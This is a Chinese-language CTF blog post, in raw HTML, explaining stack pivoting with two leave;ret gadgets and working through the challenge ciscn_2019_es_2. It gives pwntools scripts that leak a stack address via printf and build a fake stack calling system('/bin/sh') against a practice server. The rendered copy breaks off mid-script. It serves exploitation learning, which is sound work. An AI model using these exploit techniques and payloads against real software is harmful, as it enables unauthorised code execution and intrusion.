<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>栈迁移 | BLOG</title><meta name=keywords content="PWN知识点"><meta name=description content="参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
原理 leave & ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。"><meta name=author content="JUHUA"><link rel=canonical href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.4e75d3a6e83470cbf55a23cee683af5cbbe70b5bf3928f07329fc682ebf90c12.css integrity="sha256-TnXTpug0cMv1WiPO5oOvXLvnC1vzko8HMp/Gguv5DBI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="栈迁移"><meta property="og:description" content="参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
原理 leave & ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。"><meta property="og:type" content="article"><meta property="og:url" content="https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/"><meta property="og:image" content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-22T00:00:00+00:00"><meta property="article:modified_time" content="2023-06-22T00:00:00+00:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="栈迁移"><meta name=twitter:description content="参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
原理 leave & ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://juhuax.github.io/posts/"},{"@type":"ListItem","position":2,"name":"栈迁移","item":"https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"栈迁移","name":"栈迁移","description":"参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）\n适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。\n概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。\n原理 leave \u0026amp; ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip\n两次 leave\u0026amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。","keywords":["PWN知识点"],"articleBody":"参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）\n适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。\n概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。\n原理 leave \u0026 ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip\n两次 leave\u0026ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。\n首先我们对栈进行覆盖，将此时 ebp 指向的位置（也就是上一个栈帧的 ebp）覆盖为栈迁移的目的地址 a（未来 esp 中的值），return 位置覆盖为 leave\u0026ret 的地址。 然后程序开始执行，因为当前函数执行结束时本来就要执行一个 leave\u0026ret，所以进行mov esp, ebp和pop ebp，此时 esp 中的值正常，ebp 的值变为目标地址 a（因为将栈上的地址弹到 ebp 了） 接着执行 ret（pop rip），因为此时 return 的值被我们覆盖为 leave\u0026ret 的地址，所以程序会再次执行一次 leave\u0026ret。leave 执行结束后，esp 中的值是目标地址 a+4（因为还 pop ebp 了一次），ebp 的值无所谓。接着执行 ret，执行结束后 rip 的值是目标地址 a+4 中的值。 迁移成功。 此时，可能就会存在疑问，所以呢？迁移结束了又能怎样。实际上栈迁移只是我们攻击的一个步骤，目的就是将程序的执行流劫持到目标地址 a 处（在上面的步骤中实际上应该是 a+4 处，但是我只是说这么个意思，无伤大雅）。在栈迁移之前，我们已经将目标地址处覆盖为了我们要执行的代码的地址，并且构造了 ROP 链，这样就可以实现我们的攻击了。\n例题 ciscn_2019_es_2 这个题的 read 函数写死了读入 0x30 个字符，我们可以看到变量 s 距离 ebp 是 0x28 个字节，所以按照普通的方法，我们构造 payload 是 (0x28 + 4) * ‘a’ + ret_addr，这已经 0x30 个字符了，根本不够用。 所以我们考虑栈迁移\nstep 1 寻找目标地址 我们要确定目标地址是哪里，这个题中我们可以将 s 作为目标地址。那么我们需要知道 s 确切的地址。 如何获得 s 的地址呢，我们观察一下 vlu 函数的栈：\n打开 gdb，在 main 函数处下断点，找一下 vul 函数的地址 在 vul 函数处下断点，然后单步步入，进入函数 vul 查看一下 vul 的汇编 因为我们想要知道 s 的地址，所以我们先输入字符‘aaaa’，然后看看栈中的情况 在 printf 函数前打个断点，因为要先执行一个 read 函数输入‘aaaa’ 我们观察栈中的情况，eax 和 ecx 指向的地方就是 s 的地址，但是这个地址是我们本地地址，你要打远程主机不能用这个。所以我们要想方法暴露一个栈上的地址 x，然后算 x 和 s 的偏移 y，那么 s 的地址就是 x+y。 我们可以看到 ebp 指向的地方存了一个地址 0xffffd 008，这是上一个栈帧的 ebp，它距离 s 的地址的偏移是 56。那么如果可以将它暴露，就可以求得 s 的地址了。 程序中有 printf 函数，该函数在未遇到终止符 ‘\\0’时会一直输出，那么我们可以利用 printf 将栈上的值输出，得到 ebp 指向的值。 from pwn import * p = remote(\"node4.buuoj.cn\", 26588) payload1 = b'a' * 0x27 + b'b' p.send(payload1) # sendline会有终止符 p.recvuntil('b') s_addr = u32(p.recv(4)) - 56 print(hex(s_addr)) step 2 构造 payload 要实现栈迁移，只要把 ebp 和 return 位置覆盖为目标地址和 leave\u0026ret 地址就 ok 了。那么迁移后的 fake 栈上应该如何布局呢。 程序中有 system 函数，但是没有 bin/sh 字符串。那么 fake 栈应该这样布局： system_addr + fake_ret + bin_sh_addr + bin_sh_str 综上所述，最终的 payload 应该是 ‘aaaa’ + system_addr + fake_ret + bin_sh_addr + bin_sh_str + padding + s_addr + leave\u0026ret_addr 最前面的 4 个字节的 aaaa 是为了抵消掉 leave 指令中 pop ebp 导致的 esp 上移，中间的 padding 是为了补全 0x28 个字节。 完整的 exp：\nfrom pwn import * p = remote(\"node4.buuoj.cn\", 26588) payload1 = b'a' * 0x27 + b'b' p.send(payload1) # sendline会有终止符 p.recvuntil('b') s_addr = u32(p.recv(4)) - 56 print('s_addr: ', hex(s_addr)) system_addr = 0x08048400 leave_ret = 0x080484b8 payload2 = b'aaaa' + p32(system_addr) + b'aaaa' payload2 = payload2 + p32(s_addr + 0x10) payload2 = payload2 + b'/bin/sh\\x00' payload2 = payload2.ljust(0x28, b'a') payload2 = payload2 + p32(s_addr) + p32(leave_ret) p.sendline(payload2) p.interactive() 注意 payload2 中 bin/sh 字符串要加终止符\n","wordCount":"379","inLanguage":"en","datePublished":"2023-06-22T00:00:00Z","dateModified":"2023-06-22T00:00:00Z","author":{"@type":"Person","name":"JUHUA"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/"},"publisher":{"@type":"Organization","name":"BLOG","logo":{"@type":"ImageObject","url":"https://juhuax.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://juhuax.github.io/ accesskey=h title="JUHUA BLOG (Alt + H)"><img src=https://juhuax.github.io/apple-touch-icon.png alt aria-label=logo height=35>JUHUA BLOG</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://juhuax.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://juhuax.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://juhuax.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://juhuax.github.io/about/ title=about><span>about</span></a></li><li><a href=https://juhuax.github.io/search/ title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://juhuax.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://juhuax.github.io/posts/>Posts</a></div><h1 class=post-title>栈迁移</h1><div class=post-meta><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;379 words&nbsp;·&nbsp;JUHUA
创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 2分钟&nbsp;|&nbsp;JUHUA&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/1.%e5%ad%a6%e4%b9%a0/2.%e5%88%b7%e9%a2%98/CTF/PWN/%e6%a0%88%e8%bf%81%e7%a7%bb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e9%80%82%e7%94%a8%e5%9c%ba%e6%99%af aria-label=适用场景>适用场景</a></li><li><a href=#%e6%a6%82%e8%bf%b0 aria-label=概述>概述</a></li><li><a href=#%e5%8e%9f%e7%90%86 aria-label=原理>原理</a><ul><li><a href=#leave--ret aria-label="leave &amp;amp; ret">leave & ret</a></li></ul></li><li><a href=#%e4%b8%a4%e6%ac%a1-leaveret aria-label="两次 leave&amp;amp;ret">两次 leave&amp;ret</a></li><li><a href=#%e4%be%8b%e9%a2%98 aria-label=例题>例题</a><ul><li><a href=#step-1-%e5%af%bb%e6%89%be%e7%9b%ae%e6%a0%87%e5%9c%b0%e5%9d%80 aria-label="step 1 寻找目标地址">step 1 寻找目标地址</a></li><li><a href=#step-2-%e6%9e%84%e9%80%a0-payload aria-label="step 2 构造 payload">step 2 构造 payload</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p>参考：<a href=https://www.cnblogs.com/max1z/p/15299000.html>栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a>（这篇写的及其详细）</p><h2 id=适用场景>适用场景<a hidden class=anchor aria-hidden=true href=#适用场景>#</a></h2><p>当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。</p><h2 id=概述>概述<a hidden class=anchor aria-hidden=true href=#概述>#</a></h2><p>栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。
那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。
想要修改 esp 和 ebp 的值，我们需要用到 <code>leave</code> 和 <code>ret</code> 两个 gadget。</p><h2 id=原理>原理<a hidden class=anchor aria-hidden=true href=#原理>#</a></h2><h3 id=leave--ret>leave & ret<a hidden class=anchor aria-hidden=true href=#leave--ret>#</a></h3><p><code>leave</code> 命令由两句汇编指令组成：<strong>mov esp, ebp</strong>和<strong>pop ebp</strong>
它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。<strong>操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp</strong>
<code>ret</code> 命令是 <strong>pop rip</strong>
将栈顶的值弹给 rip</p><h2 id=两次-leaveret>两次 leave&amp;ret<a hidden class=anchor aria-hidden=true href=#两次-leaveret>#</a></h2><p>我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。</p><ul><li>首先我们对栈进行覆盖，将此时 ebp 指向的位置（也就是上一个栈帧的 ebp）覆盖为栈迁移的目的地址 a（未来 esp 中的值），return 位置覆盖为 leave&amp;ret 的地址。</li><li>然后程序开始执行，因为当前函数执行结束时本来就要执行一个 leave&amp;ret，所以进行<strong>mov esp, ebp</strong>和<strong>pop ebp</strong>，此时 esp 中的值正常，ebp 的值变为目标地址 a（因为将栈上的地址弹到 ebp 了）</li><li>接着执行 ret（pop rip），因为此时 return 的值被我们覆盖为 leave&amp;ret 的地址，所以程序会再次执行一次 leave&amp;ret。leave 执行结束后，esp 中的值是目标地址 a+4（因为还 pop ebp 了一次），ebp 的值无所谓。接着执行 ret，执行结束后 rip 的值是目标地址 a+4 中的值。</li><li>迁移成功。</li></ul><p>此时，可能就会存在疑问，所以呢？迁移结束了又能怎样。实际上栈迁移只是我们攻击的一个步骤，目的就是将程序的执行流劫持到目标地址 a 处（在上面的步骤中实际上应该是 a+4 处，但是我只是说这么个意思，无伤大雅）。在栈迁移之前，我们已经将目标地址处覆盖为了我们要执行的代码的地址，并且构造了 ROP 链，这样就可以实现我们的攻击了。</p><h2 id=例题>例题<a hidden class=anchor aria-hidden=true href=#例题>#</a></h2><p>ciscn_2019_es_2
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230503100937.png alt=image.png>
这个题的 read 函数写死了读入 0x30 个字符，我们可以看到变量 s 距离 ebp 是 0x28 个字节，所以按照普通的方法，我们构造 payload 是 (0x28 + 4) * &lsquo;a&rsquo; + ret_addr，这已经 0x30 个字符了，根本不够用。
所以我们考虑栈迁移</p><h3 id=step-1-寻找目标地址>step 1 寻找目标地址<a hidden class=anchor aria-hidden=true href=#step-1-寻找目标地址>#</a></h3><p>我们要确定目标地址是哪里，这个题中我们可以将 s 作为目标地址。那么我们需要知道 s 确切的地址。
如何获得 s 的地址呢，我们观察一下 vlu 函数的栈：</p><ul><li>打开 gdb，在 main 函数处下断点，找一下 vul 函数的地址<ul><li><img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230503102227.png alt=image.png></li></ul></li><li>在 vul 函数处下断点，然后单步步入，进入函数 vul<ul><li><img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230503102337.png alt=image.png></li><li>查看一下 vul 的汇编 <img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230503102438.png alt=image.png></li></ul></li><li>因为我们想要知道 s 的地址，所以我们先输入字符‘aaaa’，然后看看栈中的情况<ul><li>在 printf 函数前打个断点，因为要先执行一个 read 函数输入‘aaaa’</li><li><img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230503102816.png alt=image.png></li><li>我们观察栈中的情况，eax 和 ecx 指向的地方就是 s 的地址，但是这个地址是我们本地地址，你要打远程主机不能用这个。所以我们要想方法暴露一个栈上的地址 x，然后算 x 和 s 的偏移 y，那么 s 的地址就是 x+y。</li><li>我们可以看到 ebp 指向的地方存了一个地址 0xffffd 008，这是上一个栈帧的 ebp，它距离 s 的地址的偏移是 56。那么如果可以将它暴露，就可以求得 s 的地址了。</li></ul></li><li>程序中有 printf 函数，该函数在未遇到终止符 &lsquo;\0&rsquo;时会一直输出，那么我们可以利用 printf 将栈上的值输出，得到 ebp 指向的值。</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;node4.buuoj.cn&#34;</span><span class=p>,</span> <span class=mi>26588</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x27</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span> <span class=c1># sendline会有终止符</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span> <span class=o>-</span> <span class=mi>56</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>s_addr</span><span class=p>))</span>
</span></span></code></pre></div><p><img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230503104244.png alt=image.png></p><h3 id=step-2-构造-payload>step 2 构造 payload<a hidden class=anchor aria-hidden=true href=#step-2-构造-payload>#</a></h3><p>要实现栈迁移，只要把 ebp 和 return 位置覆盖为目标地址和 leave&amp;ret 地址就 ok 了。那么迁移后的 fake 栈上应该如何布局呢。
程序中有 system 函数，但是没有 bin/sh 字符串。那么 fake 栈应该这样布局：
system_addr + fake_ret + bin_sh_addr + bin_sh_str
综上所述，最终的 payload 应该是
‘aaaa’ + system_addr + fake_ret + bin_sh_addr + bin_sh_str + padding + s_addr + leave&amp;ret_addr
最前面的 4 个字节的 aaaa 是为了抵消掉 leave 指令中 pop ebp 导致的 esp 上移，中间的 padding 是为了补全 0x28 个字节。
完整的 exp：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;node4.buuoj.cn&#34;</span><span class=p>,</span> <span class=mi>26588</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x27</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span> <span class=c1># sendline会有终止符</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span> <span class=o>-</span> <span class=mi>56</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;s_addr: &#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>s_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=mh>0x08048400</span>
</span></span><span class=line><span class=cl><span class=n>leave_ret</span> <span class=o>=</span> <span class=mh>0x080484b8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;aaaa&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;aaaa&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>payload2</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>s_addr</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>payload2</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>payload2</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
